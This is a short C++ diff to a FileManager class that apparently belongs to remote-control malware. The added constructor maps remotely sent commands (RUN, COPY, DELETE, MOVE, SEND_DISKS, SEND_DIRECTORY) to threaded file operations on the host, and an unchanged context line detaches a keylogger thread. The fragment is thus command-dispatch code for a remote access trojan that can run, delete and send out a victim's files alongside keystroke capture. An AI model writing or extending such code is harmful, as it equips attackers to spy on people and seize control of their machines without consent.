@@ -1,4 +1,5 @@
 #include "FileManager.h"
+#include "ThreadGen.h"
 
 #include <utility>
 
@@ -148,7 +149,28 @@ void FileManager::copyFilesThread(nlohmann::json jsonObject){
     keyloggerThread.detach();
 }
 
-FileManager::FileManager(const Stream &stream) : Sender(stream){}
+
+FileManager::FileManager(const Stream &stream) : Sender(stream){
+    actionMap["RUN"] =[&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &FileManager::runFilesThread, json);
+    };
+    actionMap["COPY"]  = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &FileManager::copyFilesThread, json);
+    };
+    actionMap["DELETE"]  = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &FileManager::deleteFilesThread, json);
+    };
+    actionMap["MOVE"] = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &FileManager::moveFilesThread, json);
+    };
+    actionMap["SEND_DISKS"]  = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &FileManager::sendDisks);
+    };
+    actionMap["SEND_DIRECTORY"]  = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &FileManager::sendDirectory, json);
+    };
+}
+
 
 
 
